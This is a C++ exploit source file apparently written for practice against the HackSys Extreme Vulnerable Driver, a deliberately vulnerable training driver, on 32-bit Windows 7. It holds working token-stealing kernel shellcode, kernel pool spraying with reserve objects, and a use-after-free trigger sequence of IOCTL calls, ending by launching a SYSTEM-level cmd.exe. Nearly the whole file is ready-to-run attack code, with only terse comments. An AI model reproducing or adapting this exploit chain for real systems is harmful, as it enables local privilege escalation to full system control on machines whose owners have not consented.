//test on windows7 x86
//g++ uaf.cpp -m32 --static 
#include<stdio.h>
#include<stdint.h>
#include<windows.h>

static VOID 
xxCreateCmdLineProcess(VOID){
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi); // 创建cmd子进程
    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main(){
    char sc[] = 
        "\x90\x90\x90\x90"              // NOP Sled
        "\x60"                          // pushad
        "\x31\xc0"                      // xor eax,eax
        "\x64\x8b\x80\x24\x01\x00\x00"  // mov eax,[fs:eax+0x124]
        "\x8b\x40\x50"                  // mov eax,[eax+0x50]
        "\x89\xc1"                      // mov ecx,eax
        "\xba\x04\x00\x00\x00"          // mov edx,0x4
        "\x8b\x80\xb8\x00\x00\x00"      // mov eax,[eax+0xb8]
        "\x2d\xb8\x00\x00\x00"          // sub eax,0xb8
        "\x39\x90\xb4\x00\x00\x00"      // cmp [eax+0xb4],edx
        "\x75\xed"                      // jnz 0x1a             
        "\x8b\x90\xf8\x00\x00\x00"      // mov edx,[eax+0xf8]
        "\x89\x91\xf8\x00\x00\x00"      // mov [ecx+0xf8],edx
        "\x61"                          // popad
        "\xc3";                         // ret 
    PVOID ShellCode = VirtualAlloc(NULL,0x1000,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    if(!ShellCode){
        printf("Failed to allocate execute memory:0x%X\n",GetLastError());
        return 1;
    }
    printf("allocate execute memory:%p\n",ShellCode);
    memcpy(ShellCode,sc,sizeof(sc));
    HANDLE hDevide = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
                                GENERIC_READ | GENERIC_WRITE,
                                NULL,
                                NULL,
                                OPEN_EXISTING,
                                NULL,
                                NULL);
    if(hDevide == INVALID_HANDLE_VALUE){
        printf("Create Device Fail:0x%X\n",GetLastError());
        return 1;
    }
    DWORD recvBuf;

    typedef struct _UNICODE_STRING{
        WORD Length;
        WORD MaximumLength;
        WORD * Buffer;
    } UNICODE_STRING, *PUNICODE_STRING;
    typedef struct _OBJECT_ATTRIBUTES{
        ULONG Length;
        PVOID RootDirectory;
        PUNICODE_STRING ObjectName;
        ULONG Attributes;
        PVOID SecurityDescriptor;
        PVOID SecurityQualityOfService;
    } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

    typedef LONG(__stdcall *NtAllocateReserveObject_t) (OUT PHANDLE hObject, IN POBJECT_ATTRIBUTES ObjectAttributes, IN DWORD ObjectType);
    HMODULE hModule = LoadLibraryA("ntdll.dll");
    NtAllocateReserveObject_t NtAllocateReserveObject = (NtAllocateReserveObject_t)GetProcAddress(hModule, "NtAllocateReserveObject");
    HANDLE hReserveObjectsDefrag[10000] = { 0x0 };
    HANDLE hReserveObjectsPoolGroom[5000] = { 0x0 };
    if (NtAllocateReserveObject == NULL) {
		printf("Allocate Fail: 0x%X\n", GetLastError());
		return 1;
	}

    //Heao Spray
    for (unsigned int i = 0; i < 10000; i++) {
		LONG status = NtAllocateReserveObject(&hReserveObjectsDefrag[i], 0, 1);
		if (status != 0) {
			printf("Failed to allocate defrag reserve object 0x%X: 0x%X\n", i, GetLastError());
			return 1;
		}
	}

    for (unsigned int i = 0; i < 0x500; i++) {
		LONG status = NtAllocateReserveObject(&hReserveObjectsPoolGroom[i], 0, 1);
		if (status != 0) {
			printf("Failed to allocate pool groom reserve object 0x%X: 0x%X\n", i, GetLastError());
			return 1;
		}
	}


    //Allocate Uaf Object
    DeviceIoControl(hDevide,0x222013,NULL,0,NULL,0,&recvBuf,NULL);
    //Free Uaf Object
    DeviceIoControl(hDevide,0x22201B,NULL,0,NULL,0,&recvBuf,NULL);
    //Allocate Fake Object
    PULONG FakeObject = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x58);
	if (!FakeObject){
		printf("HeapAlloc failed :( 0x%X\r\n", GetLastError());
		return 1;
	}
    memset(FakeObject,'A',0x58);
    FakeObject[0] = (ULONG)ShellCode;
    // FakeObject[0] = (ULONG)sc; //it's ok. I don't know why
    printf("Fake Object:0x%X\n",FakeObject);
    for (unsigned int i = 0; i < 0x250; i++) {
		DeviceIoControl(hDevide,0x22201F,FakeObject,0,NULL,0,&recvBuf,NULL);
	}
    printf("Running...\n");
    //Use Fake Object..run!
    DeviceIoControl(hDevide,0x222017,NULL,0,NULL,0,&recvBuf,NULL);
    xxCreateCmdLineProcess();
    return 0;
}